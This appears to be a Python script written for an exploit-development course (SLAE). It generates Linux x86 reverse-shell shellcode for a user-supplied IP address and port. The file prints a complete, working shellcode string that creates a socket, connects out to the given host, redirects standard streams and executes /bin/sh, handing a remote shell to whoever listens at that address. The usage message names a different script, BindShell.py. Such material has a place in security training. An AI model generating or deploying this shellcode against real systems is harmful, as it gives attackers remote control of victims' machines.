#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Script        = ReverseShell.py                                                             #
# SLAE-ID       = SLAE-1115                                                                   #
# Description   = Custom Reverse Shell with configurable ip and port                          #
# Date          = 1/16/2018                                                                   #
# Author        = @ihack4falafel                                                              #
# Usage         = python ReverseShell.py <ip> <port>                                          #
#---------------------------------------------------------------------------------------------#

import sys

#---------------#---------#
W  = '\033[0m'  # White   #
P  = '\033[35m' # Purple  #
Y  = '\033[33m' # Yellow  #
#---------------#---------#

# Check ip and port input
if len(sys.argv) < 3:
  print Y+ "Usage               :" + P+  " python BindShell.py <ip> <port>               " +W
  print Y+ "Example             :" + P+  " python BindShell.py 192.168.80.129 1337       " +W
  sys.exit(0)

ip = sys.argv[1]
port = int(sys.argv[2])

# Make sure port is good!
if port < 1 or port > 65535:
  print P+ "Please specify port number between 1 and 65535" +W
  exit()

if port <= 1024:
  print P+ "This port require root privileges!" +W

# Change port to Shellcode 
port_shellcode = format(port, '04x')
port_shellcode = "\\x" + str(port_shellcode[0:2]) + "\\x" + str(port_shellcode[2:4])  

# Change ip to Shellcode
octet1, octet2, octet3, octet4 = ip.split('.')
ip_shellcode = "\\x" + format(int(octet1), '02x') + "\\x" + format(int(octet2), '02x') + "\\x" + format(int(octet3), '02x') + "\\x" + format(int(octet4), '02x')

# Print final Shellcode, and highlight ip and port in yellow ;)
print P+ "\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x50\\xb0\\x66\\xfe\\xc3\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x5b\\x43\\x5f\\x68" + Y+ ip_shellcode + P+ "\\x66\\x68" + Y+ port_shellcode + P+ "\\x66\\x6a\\x02\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x87\\xf3\\x31\\xc9\\x80\\xc1\\x02\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79\\xf8\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80" +W
